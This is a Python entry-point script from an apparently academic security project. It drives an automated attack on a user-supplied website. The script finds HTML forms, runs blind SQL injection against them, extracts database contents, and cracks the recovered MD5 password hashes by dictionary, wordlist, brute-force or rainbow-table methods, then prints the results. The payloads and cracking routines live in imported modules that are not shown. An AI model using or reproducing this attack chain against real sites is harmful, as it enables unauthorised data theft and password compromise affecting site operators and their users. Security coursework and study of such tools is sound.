'''
Python 3.8.2
Programming and Security
Polytechnic Institute of Guarda
'''

from src.lib.others.validator.url import url
from src.lib.others.validator.basic import opc
from src.lib.others.guide import console
from src.lib.algorithm.app import App
from src.lib.algorithm.hack_WEB import hack_WEB
from src.lib.algorithm.hack_SQL import hack_SQL
from src.lib.algorithm.hack_MD5 import decrypt, main
import pathlib
import json
import time

def smart_path(dir = ''):
    all_path = str(pathlib.Path(__file__).parent.absolute()).lower()
    dir_path = str(pathlib.Path().absolute()).lower()
    path = all_path.replace(dir_path,'')
    path = path.replace('\\', '/')[1:]
    if len(path)>0:
        path = path+'/'
    return path+dir

r = console({
    'ask': [
        [
            'Please, introduce website URL (e.g. http://localhost)? ',
            '1 - Dictionary \n2 - WordList \n3 - Bruteforce \n4 - RainbowTable \nPlease choose Attack type? '
        ],
        [
            ['\n*** Incorrect website! ***', url],
            ['\n*** Invalid option ***', opc]
        ]
    ]
}).log()

app = App()

#DEFINE ALL PROPERTY
hw = hack_WEB({
    'app_token' : '<hack-info>',
    'url_website' : r[0],
    'dir_root' : smart_path(''),
    'dir_hostHash' : smart_path('src/data/hashes/')+app.hostname(r[0])+'.json',
    'dir_bruteforce' : smart_path('src/data/bruteforce.json'),
    'dir_wordlist' : smart_path('src/data/wordlist.json'),
    'dir_rainbowtable' : smart_path('src/data/rainbowtable.json'),
    'dir_dictionary' : smart_path('src/data/dictionary.json'),
    'dir_knownquery' : smart_path('src/data/sqlBlind/KnownQueries.json'),
    'dir_excludeddatabase' : smart_path('src/data/sqlBlind/ExcludedDB.json'),
    'dir_queryinject' : smart_path('src/data/sqlBlind/sqlqueries.json'),
    'dir_querypiece' : smart_path('src/data/sqlBlind/sqlslicequery.json')
})
obj = hw.HTMLformOBJ()
obj = hw.injectSQL(obj)

if len(obj) > 0:
    print( "\nWe found: " + str(obj) )
    hs = hack_SQL(obj)
    obj = hs.findAllData()

    if len(obj) > 0:
        print( "\nWe found: " + str(obj) )

        do = decrypt({'sql':obj, 'obj':hs.OBJ})
        HASHES = do.getMD5()

        print('\n>>> Decrypting..')
        obj = hs.OBJ
        DICLIST = app.getJSON(obj['dir_dictionary'])
        WRDLIST = app.getJSON(obj['dir_wordlist'])
        CHRLIST = app.getJSON(obj['dir_bruteforce'])
        RBWLIST = app.getJSON(obj['dir_rainbowtable'])

        mn = main(obj)
        StartTime = time.perf_counter()
        if(r[1] == '1'): #Dictionary
            mn.exec(
                do.MD5byDictionary,
                DICLIST,
                HASHES
            )
        if(r[1] == '2'): #WordList
            mn.exec(
                do.MD5byWordList,
                WRDLIST,
                HASHES
            )
        if(r[1] == '3'): #Bruteforce
            mn.exec(
                do.MD5byBruteforce,
                CHRLIST,
                HASHES
            )
        if(r[1] == '4'): #RainbowTable
            mn.exec(
                do.MD5byRainbowTable,
                RBWLIST,
                HASHES
            )
        FinishTime = time.perf_counter()
        hostHash = obj['dir_hostHash']
        newhashes = f'{str(pathlib.Path().absolute())}/'+smart_path(hostHash)

        #RESUME
        print(f'\n[+] File: {newhashes}')
        print(json.dumps(app.getJSON(newhashes), sort_keys=True, indent=4))
        print(f'\n[+] Threads: {do.numThread}\n[+] Try: {do.numTry}\n[+] Found: {do.numFound}')
        print(f'[+] Finished in {round(FinishTime-StartTime, 3)} second(s)')